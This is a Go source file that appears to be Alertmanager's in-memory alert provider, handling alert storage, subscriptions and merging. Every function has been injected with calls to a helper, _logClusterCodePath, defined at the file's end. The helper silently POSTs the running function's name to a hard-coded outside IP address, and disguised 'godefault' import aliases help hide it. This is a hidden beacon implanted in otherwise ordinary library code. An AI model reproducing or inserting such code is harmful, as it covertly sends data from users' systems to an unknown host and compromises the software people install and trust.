package mem

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"sync"
	"time"
	"github.com/go-kit/kit/log"
	"github.com/go-kit/kit/log/level"
	"github.com/prometheus/common/model"
	"github.com/prometheus/alertmanager/provider"
	"github.com/prometheus/alertmanager/store"
	"github.com/prometheus/alertmanager/types"
)

const alertChannelLength = 200

type Alerts struct {
	alerts		*store.Alerts
	cancel		context.CancelFunc
	mtx		sync.Mutex
	listeners	map[int]listeningAlerts
	next		int
	logger		log.Logger
}
type listeningAlerts struct {
	alerts	chan *types.Alert
	done	chan struct{}
}

func NewAlerts(ctx context.Context, m types.Marker, intervalGC time.Duration, l log.Logger) (*Alerts, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	ctx, cancel := context.WithCancel(ctx)
	a := &Alerts{alerts: store.NewAlerts(intervalGC), cancel: cancel, listeners: map[int]listeningAlerts{}, next: 0, logger: log.With(l, "component", "provider")}
	a.alerts.SetGCCallback(func(alerts []*types.Alert) {
		for _, alert := range alerts {
			m.Delete(alert.Fingerprint())
		}
		a.mtx.Lock()
		for i, l := range a.listeners {
			select {
			case <-l.done:
				delete(a.listeners, i)
				close(l.alerts)
			default:
			}
		}
		a.mtx.Unlock()
	})
	a.alerts.Run(ctx)
	return a, nil
}
func (a *Alerts) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if a.cancel != nil {
		a.cancel()
	}
}
func max(a, b int) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if a > b {
		return a
	}
	return b
}
func (a *Alerts) Subscribe() provider.AlertIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var (
		ch	= make(chan *types.Alert, max(a.alerts.Count(), alertChannelLength))
		done	= make(chan struct{})
	)
	for a := range a.alerts.List() {
		ch <- a
	}
	a.mtx.Lock()
	i := a.next
	a.next++
	a.listeners[i] = listeningAlerts{alerts: ch, done: done}
	a.mtx.Unlock()
	return provider.NewAlertIterator(ch, done, nil)
}
func (a *Alerts) GetPending() provider.AlertIterator {
	_logClusterCodePath()
	defer _logClusterCodePath()
	var (
		ch	= make(chan *types.Alert, alertChannelLength)
		done	= make(chan struct{})
	)
	go func() {
		defer close(ch)
		for a := range a.alerts.List() {
			select {
			case ch <- a:
			case <-done:
				return
			}
		}
	}()
	return provider.NewAlertIterator(ch, done, nil)
}
func (a *Alerts) Get(fp model.Fingerprint) (*types.Alert, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return a.alerts.Get(fp)
}
func (a *Alerts) Put(alerts ...*types.Alert) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, alert := range alerts {
		fp := alert.Fingerprint()
		if old, err := a.alerts.Get(fp); err == nil {
			if (alert.EndsAt.After(old.StartsAt) && alert.EndsAt.Before(old.EndsAt)) || (alert.StartsAt.After(old.StartsAt) && alert.StartsAt.Before(old.EndsAt)) {
				alert = old.Merge(alert)
			}
		}
		if err := a.alerts.Set(alert); err != nil {
			level.Error(a.logger).Log("msg", "error on set alert", "err", err)
			continue
		}
		a.mtx.Lock()
		for _, l := range a.listeners {
			select {
			case l.alerts <- alert:
			case <-l.done:
			}
		}
		a.mtx.Unlock()
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
